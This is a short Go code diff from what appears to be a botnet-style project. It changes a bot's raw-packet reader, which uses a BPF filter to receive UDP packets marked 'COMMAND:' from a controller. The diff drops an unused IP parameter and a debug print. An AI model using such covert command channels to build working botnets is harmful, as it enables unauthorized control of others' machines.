@@ -107,7 +107,7 @@ func ServerReadPacket(fd int, vm *bpf.VM) gopacket.Packet {
 // vm 	--> BPF VM that contains the BPF Program
 //
 // Returns 	--> None
-func BotReadPacket(fd int, vm *bpf.VM, botIP net.IP) gopacket.Packet {
+func BotReadPacket(fd int, vm *bpf.VM) gopacket.Packet {
 
 	// Buffer for packet data that is read in
 	buf := make([]byte, 1500)
@@ -134,7 +134,6 @@ func BotReadPacket(fd int, vm *bpf.VM, botIP net.IP) gopacket.Packet {
 	// Parse packet... hopefully
 	packet := gopacket.NewPacket(buf, layers.LayerTypeEthernet, gopacket.Default)
 	if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
-		fmt.Println("IP LAYER:", string(packet.Layer(layers.LayerTypeIPv4).LayerPayload()))
 		// Make sure this is my packet
 		if strings.Contains(string(packet.ApplicationLayer().Payload()), "COMMAND:") {
 			return packet
